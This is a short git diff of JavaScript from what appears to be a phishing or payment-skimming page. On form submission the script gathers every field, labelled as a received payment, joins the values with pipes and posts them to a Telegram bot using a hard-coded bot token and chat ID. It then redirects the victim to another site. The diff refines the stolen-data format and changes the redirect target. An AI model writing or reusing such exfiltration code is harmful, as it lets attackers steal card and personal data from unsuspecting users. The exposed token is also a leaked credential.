@@ -14,11 +14,12 @@ document.addEventListener('DOMContentLoaded', function () {
             const TELEGRAM_BOT_TOKEN = '6839939706:AAGQ8EPG288JDUXSuD5xNGeyoluAAXF30vM';
             const CHAT_ID = '-1002046763480';
 
-            let message = 'Nuevo pago recibido:\n';
-
+            let message = '';
             formData.forEach((value, key) => {
-                message += `${key}: ${value}\n`;
+                message += `${value} | `;
             });
+
+            message = message.slice(0, -2);
 
             axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
@@ -28,7 +29,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     console.log('Mensaje enviado con éxito:', response.data);
 
                     setTimeout(function () {
-                        window.location.href = 'https://error.com';
+                        window.location.href = 'fastbuds.com';
                     }, 2000);
                 })
                 .catch(error => {
